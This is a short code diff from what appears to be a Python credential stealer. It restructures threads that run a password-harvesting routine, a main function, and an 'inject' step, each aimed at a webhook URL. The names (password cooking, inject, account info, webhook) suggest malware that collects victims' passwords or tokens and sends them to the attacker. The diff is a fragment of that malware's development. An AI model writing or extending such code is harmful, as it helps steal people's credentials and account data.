@@ -52,16 +52,16 @@ def main(webhook_url):
 
     cleanup()
 
-    inject(webhook_url)
-
 def pegasus():
-    t1 = password.chef()
+    t1 = password.cooking()
     t2 = main(WEBHOOK_URL)
+    t3 = inject(WEBHOOK_URL)
 
     t1.start()
     t2.start()
+    t3.start()
 
-    while t1.is_alive() or t2.isAlive():
+    while t1.is_alive() or t2.isAlive() or t3.isAlive():
         pass 
      
 def accinfo():
